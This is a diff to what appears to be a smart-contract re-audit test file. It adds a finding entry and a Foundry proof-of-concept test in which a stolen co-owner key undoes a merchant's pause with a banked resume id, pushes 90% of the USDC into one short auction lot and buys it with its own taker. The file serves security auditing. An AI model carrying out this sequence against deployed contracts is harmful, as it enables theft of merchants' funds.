@@ -19,6 +19,10 @@ pragma solidity ^0.8.26;
              any matured id (an owner-grant id un-pauses at once), consuming
              that id strands the grant it belonged to, and executeForwarderUpdate
              accepts any matured id, so a forwarder change skips its 48 h.
+        CHAIN  R-1's setting + R-2: a banked resume id undoes the merchant's
+             pause in the same block; the thief kicks 90% of the USDC into one
+             10-minute lot and its own taker buys it at the floor (bounded by
+             0.99 of the oracle; see ChainInvariants on the stacked chain PR).
         R-3  an executed daily-limit increase drains the time since the last
              spend at the new rate, freeing up to (new - old) x elapsed / 24 h
              more than the bucket earned (30k out in 12 h where 25k is allowed).
@@ -210,5 +214,53 @@ contract PoC_ReAudit20261107 is PaymentsV3Base {
         vm.prank(OWNER);
         pay.sendUSDC(2 * USDC_LIMIT, PAYEE);                   // and it goes out
         assertEq(usdc.balanceOf(PAYEE), 3 * USDC_LIMIT, "30k out in 12 h; the bucket allows 25k");
+    }
+
+    // ─────────────────────────────────────────────────────────────────────
+    // CHAIN (R-1 setting + R-2): the merchant's pause is undone in the same
+    // block, and a lot is kicked and sold to the thief's own taker
+    // ─────────────────────────────────────────────────────────────────────
+
+    /// The stolen co-owner banked a resume id days ago. The merchant pauses
+    /// auctions and, doing all it can, queues its own resume too. In the same
+    /// block the thief sets the instant knobs for the largest, shortest lot,
+    /// resumes with the banked id and kicks; ten minutes later, long before a
+    /// person can react, its own taker buys the lot at the curve's floor.
+    /// With R-2 fixed the merchant's queue replaces the banked id and the
+    /// resume reverts.
+    function test_POC_CHAIN_pauseUndoneAndLotSold() public {
+        _addCoOwner();
+        vm.prank(CO_OWNER);
+        bytes32 banked = pay.queueResumeAuctions();
+        vm.warp(vm.getBlockTimestamp() + _delay());
+        _freshFeeds();
+        _fund(50_000e6);
+
+        vm.startPrank(OWNER);
+        pay.pauseAuctions();
+        pay.queueResumeAuctions();                       // the merchant's best play
+        vm.stopPrank();
+
+        vm.startPrank(CO_OWNER);                         // same block
+        pay.setUsdcFloat(0);
+        pay.setAuctionLength(pay.MIN_AUCTION_LENGTH());
+        pay.setCbEthBps(9000);
+        pay.resumeAuctions(banked);
+        vm.stopPrank();
+        assertFalse(pay.auctionsPaused(), "pause undone in the block it was set");
+
+        address thiefTaker = makeAddr("thief-taker");
+        vm.prank(thiefTaker);
+        pay.kick();
+        (uint128 lotUsdc,, uint64 endsAt) = pay.lot();
+        assertEq(uint256(lotUsdc), 45_000e6, "90% of the treasury's USDC in one lot");
+
+        vm.warp(uint256(endsAt) - 1);                    // ten minutes: the floor
+        uint256 required = _take(thiefTaker);
+        assertEq(usdc.balanceOf(thiefTaker), 45_000e6, "the thief's taker holds the lot");
+        // Bounded by the floor: at least 0.99 of the oracle value was paid.
+        assertGe(required * 100, _oracleCbEth(45_000e6) * 99, "paid at or above the 0.99 floor");
+        emit log_named_uint("cbETH paid by the thief's taker", required);
+        emit log_named_uint("cbETH at the oracle for the lot", _oracleCbEth(45_000e6));
     }
 }
